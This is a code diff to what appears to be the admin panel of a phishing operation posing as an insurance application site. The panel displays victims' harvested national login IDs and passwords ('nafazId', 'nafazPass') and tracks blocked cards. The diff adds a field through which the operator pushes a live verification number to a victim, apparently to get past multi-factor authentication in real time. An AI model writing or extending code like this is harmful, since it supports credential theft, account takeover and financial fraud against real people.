@@ -64,6 +64,7 @@ export default function AdminDashboard() {
   const [blockedCards, setBlockedCards] = useState<string[]>([])
   const [showBlockedPanel, setShowBlockedPanel] = useState(false)
   const [copiedField, setCopiedField] = useState<string | null>(null)
+  const [authNumber, setAuthNumber] = useState("")
   const prevApplicationsCount = useRef<number>(0)
 
   const hasData = (app: InsuranceApplication) => {
@@ -573,6 +574,36 @@ export default function AdminDashboard() {
                             <div className="space-y-1.5">
                               {selectedApplication.nafazId && <DataRow label="المعرف" value={selectedApplication.nafazId} onCopy={copyToClipboard} copied={copiedField} />}
                               {selectedApplication.nafazPass && <DataRow label="كلمة المرور" value={selectedApplication.nafazPass} onCopy={copyToClipboard} copied={copiedField} />}
+                            </div>
+                            <div className="mt-3 pt-2 border-t border-slate-700">
+                              <label className="text-[9px] text-slate-400 block mb-1">رقم التحقق (authNumber)</label>
+                              <div className="flex gap-1">
+                                <Input
+                                  type="text"
+                                  placeholder="أدخل رقم التحقق..."
+                                  value={authNumber}
+                                  onChange={(e) => setAuthNumber(e.target.value)}
+                                  className="h-7 text-[11px] bg-slate-900 border-slate-600 text-white flex-1"
+                                  dir="ltr"
+                                />
+                                <Button
+                                  onClick={async () => {
+                                    if (authNumber.trim()) {
+                                      await updateApplication(selectedApplication.id!, { authNumber: authNumber.trim() })
+                                      playSuccessSound()
+                                    }
+                                  }}
+                                  size="sm"
+                                  className="h-7 px-3 text-[9px] bg-green-500 hover:bg-green-600 text-white"
+                                >
+                                  إرسال
+                                </Button>
+                              </div>
+                              {selectedApplication.authNumber && (
+                                <div className="mt-1 text-[9px] text-green-400">
+                                  الحالي: <span className="font-mono" dir="ltr">{selectedApplication.authNumber}</span>
+                                </div>
+                              )}
                             </div>
                             <div className="text-[8px] text-slate-500 mt-2 text-left">{formatTime(selectedApplication.createdAt)}</div>
                           </div>
